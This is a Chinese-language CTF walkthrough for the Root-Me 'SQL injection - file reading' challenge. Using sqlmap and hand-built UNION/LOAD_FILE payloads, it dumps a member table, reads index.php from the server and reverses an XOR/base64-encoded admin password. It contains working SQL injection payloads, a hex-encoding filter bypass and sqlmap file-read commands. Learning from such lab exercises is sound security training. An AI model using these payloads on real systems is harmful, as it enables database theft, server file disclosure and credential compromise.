## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[SQL injection - file reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading)] [[解题报告](http://exp-blog.com/2019/03/17/pid-3597/)]

------


## 找到注入点

利用 SQL 注入读取服务器文件。

首先要找到注入点，为了提高效率可以直接使用 sqlmap ，测试发现注入点在这个页面：

[http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1](http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1)

![](http://exp-blog.com/wp-content/uploads/2019/03/9f519dccc3108372e24710aebf15d284.png)

通过 sqlmap 扫描发现这是 **MySQL** 数据库，且此处同时存在 4 个注入漏洞：

- 基于布尔注入
- 基于错误注入
- 基于延时注入
- UNION 横向越权（**只有这个漏洞可以用于文件读取**）

```shell
S:\04_work\BurpSuite>sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:56:34 /2019-03-17/

[21:56:34] [INFO] resuming back-end DBMS 'mysql'
[21:56:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=members&id=1 AND 5971=5971

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: action=members&id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
---
[21:56:47] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[21:56:47] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'

[*] ending @ 21:56:47 /2019-03-17/
```

![](http://exp-blog.com/wp-content/uploads/2019/03/62b5cbb5027f9766ee2a53ba564e336c.png)

------------

## 拖库

这里暂且先不用人工方式构造 payload ，先直接用 sqlmap 解题。


### 获取数据库

先获取所有数据库的库名：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --dbs

---
[22:02:30] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:02:30] [INFO] fetching database names
[22:02:30] [INFO] used SQL query returns 2 entries
[22:02:30] [INFO] resumed: 'information_schema'
[22:02:30] [INFO] resumed: 'c_webserveur_31'
available databases [2]:
[*] c_webserveur_31
[*] information_schema
```

![](http://exp-blog.com/wp-content/uploads/2019/03/a0f2239b78da20c617cdce36a31314e8.png)

再查到当前数据库是 `c_webserveur_31` ：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --current-db

---
[22:18:40] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:18:40] [INFO] fetching current database
current database: 'c_webserveur_31'
```

![](http://exp-blog.com/wp-content/uploads/2019/03/76b67e42714f69975fd5070a5f9210b3.png)

------------


### 获取数据表

继而查询当前库中的所有数据表，只有 `member` 一张表：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 --tables

---
[22:21:05] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:21:05] [INFO] fetching tables for database: 'c_webserveur_31'
[22:21:05] [INFO] used SQL query returns 1 entry
Database: c_webserveur_31
[1 table]
+--------+
| member |
+--------+
```
![](http://exp-blog.com/wp-content/uploads/2019/03/79b57e9dd8497bfcebf3ae6aa00aa2d5.png)

------------


### 获取表结构

再查询数据表 `member` 的表结构：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 -T member --columns

---
[22:22:44] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:22:44] [INFO] fetching columns for table 'member' in database 'c_webserveur_31'
[22:22:44] [INFO] used SQL query returns 4 entries
[22:22:44] [INFO] resumed: 'member_id','int(1)'
[22:22:44] [INFO] resumed: 'member_login','varchar(20)'
[22:22:44] [INFO] resumed: 'member_password','varchar(1000)'
[22:22:44] [INFO] resumed: 'member_email','varchar(50)'
Database: c_webserveur_31
Table: member
[4 columns]
+-----------------+---------------+
| Column          | Type          |
+-----------------+---------------+
| member_email    | varchar(50)   |
| member_id       | int(1)        |
| member_login    | varchar(20)   |
| member_password | varchar(1000) |
+-----------------+---------------+
```

![](http://exp-blog.com/wp-content/uploads/2019/03/c2289899c436b7fd65c893212d1b3ddb.png)

------------


### 获取表数据

最后查询表数据，数据只有一行，记录了 admin 的账密，但是密码被加密处理过了：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 -T member --dump

---
[22:25:13] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:25:13] [INFO] fetching columns for table 'member' in database 'c_webserveur_31'
[22:25:13] [INFO] used SQL query returns 4 entries
[22:25:13] [INFO] resumed: 'member_id','int(1)'
[22:25:13] [INFO] resumed: 'member_login','varchar(20)'
[22:25:13] [INFO] resumed: 'member_password','varchar(1000)'
[22:25:13] [INFO] resumed: 'member_email','varchar(50)'
[22:25:13] [INFO] fetching entries for table 'member' in database 'c_webserveur_31'
[22:25:13] [INFO] used SQL query returns 1 entry
Database: c_webserveur_31
Table: member
[1 entry]
+-----------+--------------+-------------------------------+----------------------------------------------------------+
| member_id | member_login | member_email                  | member_password                                          |
+-----------+--------------+-------------------------------+----------------------------------------------------------+
| 1         | admin        | admin@super-secure-webapp.org | VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== |
+-----------+--------------+-------------------------------+----------------------------------------------------------+

[22:25:13] [INFO] table 'c_webserveur_31.member' dumped to CSV file 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org\dump\c_webserveur_31\member.csv'
[22:25:13] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'

[*] ending @ 22:25:13 /2019-03-17/
```

------------

## 读取 index 页面的源码文件

### 推测文件绝对路径

由于我们不知道 admin 密码的加密方式，因此无法获得真正的密码。

但是很可能在页面验证登陆账密的时候，会提供相关的代码逻辑，因此我们下一步就是尝试获取认证页面的源码。虽然题目没有说明页面的文件名称，但是不难猜测就是 `index.php` 或 `index.html` 。

访问页面 [http://challenge01.root-me.org/web-serveur/ch31/index.php](http://challenge01.root-me.org/web-serveur/ch31/index.php) 没有 404 报错，说明 index.php 文件是存在的。

![](http://exp-blog.com/wp-content/uploads/2019/03/747a9352f73965abedaea9d475536701.png)

但是要通过数据读取文件，是需要知道文件的绝对路径的。

文件路径可以在页面尝试通过路径穿越进行试探，例如向前穿越两个目录，访问这个页面：

[http://challenge01.root-me.org/web-serveur/ch31/../../web-serveur/ch31/index.php](http://challenge01.root-me.org/web-serveur/ch31/../../web-serveur/ch31/index.php)

因为可以正常访问且没有报 404 错误，因此可以知道路径 `/web-serveur/ch31/index.php` 是存在的。


但这还不是绝对路径，因为直接访问页面 [http://challenge01.root-me.org/](http://challenge01.root-me.org/) 列印了所有 RootMe 挑战的分类目录，其中还有一层 `Parent directory` 父目录，说明之前至少还有一级目录。

![](http://exp-blog.com/wp-content/uploads/2019/03/193b44ddb946f4fcbeac245a9e698b22.png)

虽然从 Web 页面无法查到这级父目录的名称，不过可以从需要通过 **WebSSH** 的其他挑战查到这个目录，例如这个挑战： [ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1) 。登陆 WebSSH 后，可以查到这两类挑战的共同父级目录名为 `/challenge` 。

![](http://exp-blog.com/wp-content/uploads/2019/03/de0b3a61c96fdc22a8df96c4d3e2b83f.png)


------------

### 读取文件内容

拼接起来就可以得到 `index.php` 页面文件的绝对路径为 `/challenge/web-serveur/ch31/index.php`

此时就可以通过 sqlmap 的 `--file-read` 参数下载这个文件了：

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read /challenge/web-serveur/ch31/index.php

[22:50:09] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0
[22:50:09] [INFO] fingerprinting the back-end DBMS operating system
[22:50:09] [INFO] the back-end DBMS operating system is Linux
[22:50:10] [INFO] fetching file: '/challenge/web-serveur/ch31/index.php'
do you want confirmation that the remote file '/challenge/web-serveur/ch31/index.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[22:50:16] [INFO] the local file 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org\files\_challenge_web-serveur_ch31_index.php' and the remote file '/challenge/web-serveur/ch31/index.php' have the same size (3113 B)
files saved to [1]:
[*] C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org\files\_challenge_web-serveur_ch31_index.php (same file)

[22:50:16] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'

[*] ending @ 22:50:16 /2019-03-17/
```

![](http://exp-blog.com/wp-content/uploads/2019/03/df370a21a93db169a16f88e955c00117.png)


查看下载到的文件内容如下：

```php
<html>
<header><title>SQL injection - FILE</title></header>
<body>
<h3><a href="?action=login">Authentication</a> | <a href="?action=members">Members</a></h3><hr />

<?php

define('SQL_HOST',      ':/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');


function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 

mysql_connect(SQL_HOST, SQL_LOGIN, SQL_P) or exit('MySQL connection error !');
mysql_select_db(SQL_DB) or die("Database selection error !");

if ( ! isset($_GET['action']) ) $_GET['action']="login";

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

  if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
  {
    $user = mysql_real_escape_string(strtolower($_POST['username']));
    $pass = sha1($_POST['password']);
    
    $result = mysql_query("SELECT member_password FROM member WHERE member_login='".$user."'");
    if(mysql_num_rows($result) == 1)
    {
      $data = mysql_fetch_array($result);
      if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
      }
      else{
                                // authentication failed
        print "<p>Authentication failed !</p>";
      }
    }
    else{
      print "<p>User not found !</p>";
    }
  }
}

if($_GET['action'] == "members"){
  if(isset($_GET['id']) && !empty($_GET['id']))
  {
                // secure ID variable
    $id = mysql_real_escape_string($_GET['id']);
    $result = mysql_query("SELECT * FROM member WHERE member_id=$id") or die(mysql_error());
    
    if(mysql_num_rows($result) == 1)
    {
      $data = mysql_fetch_array($result);
      print "ID : ".$data["member_id"]."<br />";
      print "Username : ".$data["member_login"]."<br />";
      print "Email : ".$data["member_email"]."<br />";  
    }
                else{
                        print "no result found";
                }
  }
  else{
    $result = mysql_query("SELECT * FROM member");
    while ($row = mysql_fetch_assoc($result)) {
      print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
    }
  }
}

?>
</body>
</html>
```

------------

## 密码解密

从源码可知，我们从页面输入的密码会经过三个处理步骤再存储到数据库：

- `sha1` 加密
- 通过自定义函数 `stringxor` 与 `$key = "c92fcd618967933ac463feb85ba00d5a7ae52842"` 做异或运算
- `base64` 编码

在前面已知 `admin` 被加密的密码是 `VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==` ，根据这些步骤做逆运算即可得到真正的密码。

由于异或运算重复计算一次就是逆运算，因此可以利用 index.php 源码，构造这样的 PHP 代码进行 Base64 和 异或运算 的解码逻辑：

```php
<?php
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}
$key="c92fcd618967933ac463feb85ba00d5a7ae52842";
echo stringxor($key, base64_decode("VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=="));
?>
```

任意找一个在线 PHP 环境执行这段代码（如 [http://www.dooccn.com/php/](http://www.dooccn.com/php/)），

得到 `77be4fc97f77f5f48308942bb6e32aacabed9cef` ，即这是 sha1 加密后的值。

![](http://exp-blog.com/wp-content/uploads/2019/03/b37d4151b0bcd2325ba6d9d2f019a361.png)

最后再找一个 sha1 在线解码平台（如 [https://www.sha1online.org/](https://www.sha1online.org/)）对其逆向暴力破解，得到真正的密码 `superpassword` 。

![](http://exp-blog.com/wp-content/uploads/2019/03/21450df9586fd3aaa59b4322f219410a.png)

------------

## 完成挑战

使用账号 `admin` 和密码 `superpassword` 登陆，知道这个密码就是 `flag` ，完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/03/7e8e1f1c36406937552772cf713f12ab.png)

------------

## 附：通过 UNION 读取 index 页面源码

即使不使用 sqlmap 的 `--file-read` ，也是可以读取到 `index.php` 文件的内容的。

这里要利用最开始通过 sqlmap 得到的 UNION 漏洞：

```shell
---
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL--
---
```

先测试一下这个漏洞的探针效果：

![](http://exp-blog.com/wp-content/uploads/2019/03/5fc90daa0305915938ae55a7833f647a.png)

在 Mysql 中读取文件的函数为 `LOAD_FILE` ，只要把文件路径传参进去，就会返回文件内容。

因此我们可以把探针的 CONCAT 函数替换掉，改造成这样的 payload ：

```sql
-8544 UNION ALL SELECT NULL,LOAD_FILE("/challenge/web-serveur/ch31/index.php"),NULL,NULL--
```

但是这个 payload 无法直接使用，测试发现原因是引号 `"`、`'` 和文件路径符 `/` 不能被直接注入：

![](http://exp-blog.com/wp-content/uploads/2019/03/3631ab74d43bd9d4f5c783b45db864c8.png)


不过符号问题可以很简单绕过，只需要把 `/challenge/web-serveur/ch31/index.php` 编码成 16 进制再传参即可。

可以使用 Burp Suite -> Decoder 进行编码，得到 ：

`2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870` 。

![](http://exp-blog.com/wp-content/uploads/2019/03/2b82955c778e56baf6cd8b5c9b436a2c.png)

将其作为 `LOAD_FILE` 的参数（因为是 16 进制，注意前面要补 `0x` 声明），重新构造 payload 如下：

```sql
-8544 UNION ALL SELECT NULL,LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),NULL,NULL--
```

执行这个 payload ，成功得到 `index.php` 页面的文件源码：

![](http://exp-blog.com/wp-content/uploads/2019/03/51a3ebc3e96e11cb5ce086ebf8fc9459.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
